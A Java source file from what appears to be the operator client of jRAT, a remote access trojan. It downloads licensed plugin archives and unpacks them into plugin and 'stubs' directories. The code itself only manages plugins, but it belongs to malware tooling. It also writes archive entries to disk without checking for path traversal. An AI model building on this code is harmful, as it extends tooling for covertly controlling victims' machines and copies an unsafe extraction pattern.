package su.jrat.client.addons;

import java.awt.Color;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.security.InvalidKeyException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import su.jrat.client.Constants;
import su.jrat.client.Globals;
import su.jrat.client.Main;
import su.jrat.client.UniqueId;
import su.jrat.client.exceptions.MissingKeyException;
import su.jrat.client.listeners.ExtensionInstallerListener;
import su.jrat.client.net.WebRequest;
import su.jrat.common.Logger;
import su.jrat.common.codec.Hex;
import su.jrat.common.listeners.CopyStreamsListener;
import su.jrat.common.utils.IOUtils;


public class PluginInstaller {

	private OnlinePlugin plugin;
	private ExtensionInstallerListener listener;

	public PluginInstaller(OnlinePlugin plugin, ExtensionInstallerListener listener) {
		this.plugin = plugin;
		this.listener = listener;
	}

	public void toggle() throws Exception {
		if (plugin.isInstalled()) {
			install(); // TODO
		} else {
			install();
		}
	}

	public void uninstall() throws Exception {
		Logger.log(plugin.getJar().delete());
		Logger.log(plugin.getDirectory().delete());
	}

	public void install() throws Exception {
		listener.status(Color.black, "Connecting...", 0, 100);

		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");

		String key = "jrat";
		try {
			key = Hex.encode(UniqueId.getSystemId());
		} catch (Exception e) {
			throw new MissingKeyException("Failed to load key", e);
		}
		
		if (Main.debug) {
			key = "DEBUG_KEY";
		}

		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + key);
		archiveConnection.setReadTimeout(15000);
		archiveConnection.connect();


		int response = archiveConnection.getResponseCode();

		if (response == 400) {
			throw new MalformedURLException("Failed to send correct request");
		} else if (response == 404) {
			throw new FileNotFoundException("Failed to find plugin package: " + plugin.getName());
		} else if (response == 401) {
			throw new InvalidKeyException("Key not found, not valid license?");
		}

		InputStream in = archiveConnection.getInputStream();

		final int length = archiveConnection.getContentLength();

		Logger.log(length);

		FileOutputStream out = new FileOutputStream(temp);

		IOUtils.copy(length, in, out, new CopyStreamsListener() {
			@Override
			public void chunk(long current, long total, int percent) {
				if (length == -1) {
					listener.status(Color.black, "Downloaded " + (current / 1024L) + " kB", (int) current, (int) total);
				} else {
					listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + (total / 1024L) + " kB", (int) current, (int) total);
				}
			}
		});

		out.close();
		in.close();

		ZipFile zip = new ZipFile(temp);
		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
		List<ZipEntry> entries = new ArrayList<ZipEntry>();

		while (entriesEnum.hasMoreElements()) {
			entries.add(entriesEnum.nextElement());
		}

		List<File> mainJars = new ArrayList<File>();

		for (int i = 0; i < entries.size(); i++) {
			ZipEntry entry = entries.get(i);

			File output;

			if (entry.getName().startsWith("stubs/") && entry.getName().toLowerCase().endsWith(".jar")) {
				output = new File(Globals.getPluginStubDirectory(), plugin.getName() + " " + entry.getName().substring(6, entry.getName().length()));
			} else if (entry.getName().startsWith("root/")) {
				output = new File(Globals.getPluginDirectory(), entry.getName().substring(5, entry.getName().length()));
				if (!entry.getName().equals("root/")) {
					mainJars.add(output);
				}
			} else {
				output = new File(Globals.getPluginDirectory(), plugin.getName() + "/" + entry.getName());
			}

			if (output.isDirectory()) {
				continue;
			}

			if (output.getParentFile() != null && !output.getParentFile().exists()) {
				output.getParentFile().mkdirs();
			}

			output.createNewFile();

			listener.status(Color.black, "Writing " + output.getName(), i, entries.size());

			InputStream entryIs = zip.getInputStream(entry);
			FileOutputStream entryOut = new FileOutputStream(output);

			IOUtils.copy(entryIs, entryOut);

			entryIs.close();
			entryOut.close();
		}

		zip.close();

		temp.delete();

		for (File file : mainJars) {
			new Plugin(file);
		}

		Main.instance.reloadPlugins();
	}

}
